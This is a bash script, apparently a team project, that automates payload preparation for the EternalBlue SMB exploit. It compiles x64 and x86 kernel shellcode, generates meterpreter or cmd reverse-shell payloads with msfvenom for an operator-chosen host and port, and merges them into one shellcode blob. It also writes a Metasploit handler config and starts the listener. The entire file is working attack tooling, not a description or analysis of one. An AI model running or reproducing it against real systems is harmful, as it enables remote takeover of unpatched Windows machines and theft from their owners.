#!/bin/bash
echo "================================================"
echo "Eternal Blue Automated Script"
echo
echo "Created by Team4 - Ashfak, Umar, Ethan "
echo "================================================"

echo Eternal Blue Windows Shellcode Compiler
echo
echo Let\'s compile the windows shellcode
echo
echo "Compiling x64 kernel shellcode"
nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o shellcode/sc_x64_kernel.bin
echo "Compiling x86 kernel shellcode"
nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o shellcode/sc_x86_kernel.bin
echo "kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y/n)"
read input
if [[ $input =~ [yY](es)* ]]
then
    echo "LHOST IP address for reverse connection:"
    read lip
    echo "LPORT for x64 payload:"
    read portOne
    echo "LPORT for x86 payload:"
    read portTwo
    echo "Type 1 to generate a meterpreter shell or 2 to generate a regular cmd shell"
    read cmd
    if [[ $cmd -eq 1 ]]
    then
        echo "Generating x64 meterpreter shell..."
        echo
	msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o shellcode/sc_x64_msf.bin EXITFUNC=thread LHOST=$lip LPORT=$portOne
        echo 
        echo "Generating x86 meterpreter shell..."
        echo
	msfvenom -p windows/meterpreter/reverse_tcp -f raw -o shellcode/sc_x86_msf.bin EXITFUNC=thread LHOST=$lip LPORT=$portTwo
	echo
        touch config.rc
        echo use exploit/multi/handler > config.rc
        echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
        echo set LHOST $lip >> config.rc
        echo set LPORT $portOne >> config.rc
        echo set ExitOnSession false >> config.rc
        echo set EXITFUNC thread >> config.rc
        echo exploit -j >> config.rc
        echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
        echo set LPORT $portTwo >> config.rc
        echo exploit -j >> config.rc

    elif [[ $cmd -eq 2 ]]
    then
        echo "Generating x64 cmd shell..."
        echo
        msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shellcode/sc_x64_msf.bin EXITFUNC=thread LHOST=$lip LPORT=$portOne
        echo
        echo "Generating x86 cmd shell..."
        echo
        msfvenom -p windows/shell/reverse_tcp -f raw -o shellcode/sc_x86_msf.bin EXITFUNC=thread LHOST=$lip LPORT=$portTwo
	echo
        touch config.rc
        echo use exploit/multi/handler > config.rc
        echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
        echo set LHOST $lip >> config.rc
        echo set LPORT $portOne >> config.rc
        echo set ExitOnSession false >> config.rc
        echo set EXITFUNC thread >> config.rc
        echo exploit -j >> config.rc
        echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
        echo set LPORT $portTwo >> config.rc
        echo exploit -j >> config.rc

    else
        echo "Invalid option...exiting..."
    fi
echo
echo "MERGING SHELLCODE!!"
cat shellcode/sc_x64_kernel.bin shellcode/sc_x64_msf.bin > shellcode/sc_x64.bin
cat shellcode/sc_x86_kernel.bin shellcode/sc_x86_msf.bin > shellcode/sc_x86.bin
python shellcode/eternalblue_sc_merge.py shellcode/sc_x86.bin shellcode/sc_x64.bin shellcode/sc_all.bin
echo
echo "Starting listener..."
service postgresql start
msfconsole -r config.rc
service postgresql stop
rm config.rc
else
    echo "Make sure you merge shellcode properly."
fi
echo DONE
